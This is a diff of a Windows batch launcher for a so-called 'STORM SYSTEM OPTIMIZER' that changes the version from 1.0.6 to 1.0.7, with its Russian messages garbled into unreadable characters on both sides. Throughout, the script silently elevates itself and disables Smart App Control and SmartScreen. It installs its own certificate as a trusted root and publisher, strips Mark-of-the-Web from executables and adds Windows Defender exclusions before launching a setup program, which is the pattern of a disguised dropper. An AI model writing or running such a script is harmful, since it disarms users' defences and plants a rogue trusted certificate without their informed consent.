@@ -1,19 +1,19 @@
-ï»¿@echo off
+@echo off
 chcp 65001 >nul
-title STORM SYSTEM OPTIMIZER - Ð Ð°Ð·Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ° Smart App Control Ð¸ Ð”Ð¾Ð²ÐµÑ€Ð¸Ðµ Ð¡ÐµÑ€Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð°
+title STORM SYSTEM OPTIMIZER - Ðàçáëîêèðîâêà Smart App Control è Äîâåðèå Ñåðòèôèêàòà
 
 :: ============================================================
-:: 1. ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð¸ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð¿Ñ€Ð°Ð² ÐÐ´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð°
+:: 1. Ïðîâåðêà è àâòîìàòè÷åñêèé çàïðîñ ïðàâ Àäìèíèñòðàòîðà
 :: ============================================================
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [i] Ð—Ð°Ð¿Ñ€Ð¾Ñ Ð¿Ñ€Ð°Ð² Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð° Ð´Ð»Ñ ÑÐ½ÑÑ‚Ð¸Ñ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ¸ Smart App Control...
+    echo [i] Çàïðîñ ïðàâ àäìèíèñòðàòîðà äëÿ ñíÿòèÿ áëîêèðîâêè Smart App Control...
     powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
 echo ============================================================
-echo   STORM SYSTEM OPTIMIZER v1.0.6 - Ð¡ÐÐ¯Ð¢Ð˜Ð• Ð’Ð¡Ð•Ð¥ Ð‘Ð›ÐžÐšÐ˜Ð ÐžÐ’ÐžÐš
+echo   STORM SYSTEM OPTIMIZER v1.0.7 - ÑÍßÒÈÅ ÂÑÅÕ ÁËÎÊÈÐÎÂÎÊ
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
@@ -35,65 +35,65 @@ if not exist "%CERT_FILE%" (
 )
 
 :: ============================================================
-:: 2. ÐžÑ‚ÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ðµ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð¾Ðº Smart App Control Ð¸ SmartScreen
+:: 2. Îòêëþ÷åíèå áëîêèðîâîê Smart App Control è SmartScreen
 :: ============================================================
-echo [1/5] Ð¡Ð½ÑÑ‚Ð¸Ðµ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ¸ Ð˜Ð½Ñ‚ÐµÐ»Ð»ÐµÐºÑ‚ÑƒÐ°Ð»ÑŒÐ½Ð¾Ð³Ð¾ ÑƒÐ¿Ñ€Ð°Ð²Ð»ÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑÐ¼Ð¸ (Smart App Control)...
+echo [1/5] Ñíÿòèå áëîêèðîâêè Èíòåëëåêòóàëüíîãî óïðàâëåíèÿ ïðèëîæåíèÿìè (Smart App Control)...
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SAC_PreviousState" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
-echo [OK] Ð‘Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ° Smart App Control ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð½ÐµÐ¹Ñ‚Ñ€Ð°Ð»Ð¸Ð·Ð¾Ð²Ð°Ð½Ð°!
+echo [OK] Áëîêèðîâêà Smart App Control óñïåøíî íåéòðàëèçîâàíà!
 
 :: ============================================================
-:: 3. Ð£ÑÑ‚Ð°Ð½Ð¾Ð²ÐºÐ° Ñ†Ð¸Ñ„Ñ€Ð¾Ð²Ð¾Ð³Ð¾ ÑÐµÑ€Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð° STORM TEAM Ð²Ð¾ Ð²ÑÐµ Ñ…Ñ€Ð°Ð½Ð¸Ð»Ð¸Ñ‰Ð°
+:: 3. Óñòàíîâêà öèôðîâîãî ñåðòèôèêàòà STORM TEAM âî âñå õðàíèëèùà
 :: ============================================================
 echo.
 if exist "%CERT_FILE%" (
-    echo [2/5] Ð ÐµÐ³Ð¸ÑÑ‚Ñ€Ð°Ñ†Ð¸Ñ Ð´Ð¾Ð²ÐµÑ€Ð¸Ñ Ñ†Ð¸Ñ„Ñ€Ð¾Ð²Ð¾Ð³Ð¾ ÑÐµÑ€Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð° STORM TEAM...
+    echo [2/5] Ðåãèñòðàöèÿ äîâåðèÿ öèôðîâîãî ñåðòèôèêàòà STORM TEAM...
     certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
-    echo [OK] Ð¡ÐµÑ€Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚ STORM TEAM ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð´Ð¾Ð±Ð°Ð²Ð»ÐµÐ½ Ð² Ð”Ð¾Ð²ÐµÑ€ÐµÐ½Ð½Ñ‹Ðµ ÐºÐ¾Ñ€Ð½ÐµÐ²Ñ‹Ðµ Ñ†ÐµÐ½Ñ‚Ñ€Ñ‹ Ð¸ Ð˜Ð·Ð´Ð°Ñ‚ÐµÐ»Ð¸!
+    echo [OK] Ñåðòèôèêàò STORM TEAM óñïåøíî äîáàâëåí â Äîâåðåííûå êîðíåâûå öåíòðû è Èçäàòåëè!
 ) else (
-    echo [!] Ð¤Ð°Ð¹Ð» ÑÐµÑ€Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð° Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½: %CERT_FILE%
+    echo [!] Ôàéë ñåðòèôèêàòà íå íàéäåí: %CERT_FILE%
 )
 
 :: ============================================================
-:: 4. Ð¡Ð½ÑÑ‚Ð¸Ðµ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚-Ð¼ÐµÑ‚ÐºÐ¸ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ¸ (Mark-of-the-Web)
+:: 4. Ñíÿòèå èíòåðíåò-ìåòêè áëîêèðîâêè (Mark-of-the-Web)
 :: ============================================================
 echo.
-echo [3/5] Ð¡Ð½ÑÑ‚Ð¸Ðµ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚-Ð¼ÐµÑ‚Ð¾Ðº Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ¸ (Unblock Mark-of-the-Web)...
+echo [3/5] Ñíÿòèå èíòåðíåò-ìåòîê áëîêèðîâêè (Unblock Mark-of-the-Web)...
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
-echo [OK] Ð’ÑÐµ Ñ„Ð°Ð¹Ð»Ñ‹ Ð¸ Ð±Ð¸Ð±Ð»Ð¸Ð¾Ñ‚ÐµÐºÐ¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ñ€Ð°Ð·Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ð½Ñ‹!
+echo [OK] Âñå ôàéëû è áèáëèîòåêè óñïåøíî ðàçáëîêèðîâàíû!
 
 :: ============================================================
-:: 5. Ð”Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ð¸Ðµ Ð¿Ð°Ð¿ÐºÐ¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ñ‹ Ð² Ð¸ÑÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ñ Windows Defender
+:: 5. Äîáàâëåíèå ïàïêè ïðîãðàììû â èñêëþ÷åíèÿ Windows Defender
 :: ============================================================
 echo.
-echo [4/5] Ð”Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ð¸Ðµ Ð¿Ð°Ð¿ÐºÐ¸ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ Ð² Ð´Ð¾Ð²ÐµÑ€ÐµÐ½Ð½ÑƒÑŽ Ð·Ð¾Ð½Ñƒ Ð—Ð°Ñ‰Ð¸Ñ‚Ð½Ð¸ÐºÐ°...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.6_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-echo [OK] Ð˜ÑÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ñ Ð¸ Ð·Ð°Ñ‰Ð¸Ñ‚Ð° Ð¾Ñ‚ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð¾Ðº Ð´Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ñ‹!
+echo [4/5] Äîáàâëåíèå ïàïêè ïðèëîæåíèÿ â äîâåðåííóþ çîíó Çàùèòíèêà...
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+echo [OK] Èñêëþ÷åíèÿ è çàùèòà îò áëîêèðîâîê äîáàâëåíû!
 
 :: ============================================================
-:: 6. Ð—Ð°Ð¿ÑƒÑÐº Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ / ÑƒÑÑ‚Ð°Ð½Ð¾Ð²Ñ‰Ð¸ÐºÐ°
+:: 6. Çàïóñê ïðèëîæåíèÿ / óñòàíîâùèêà
 :: ============================================================
 echo.
-echo [5/5] Ð—Ð°Ð¿ÑƒÑÐº STORM SYSTEM OPTIMIZER v1.0.6...
+echo [5/5] Çàïóñê STORM SYSTEM OPTIMIZER v1.0.7...
 echo.
 echo ============================================================
-echo   Ð“ÐžÐ¢ÐžÐ’Ðž! Ð’ÑÐµ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÐ¸ ÑÐ¸ÑÑ‚ÐµÐ¼Ñ‹ ÑÐ½ÑÑ‚Ñ‹.
+echo   ÃÎÒÎÂÎ! Âñå áëîêèðîâêè ñèñòåìû ñíÿòû.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.6_Setup.exe" (
-    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.6_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe"
 ) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
     start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
-) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.6_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.6_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.7_Setup.exe"
 )
 
 timeout /t 3 >nul
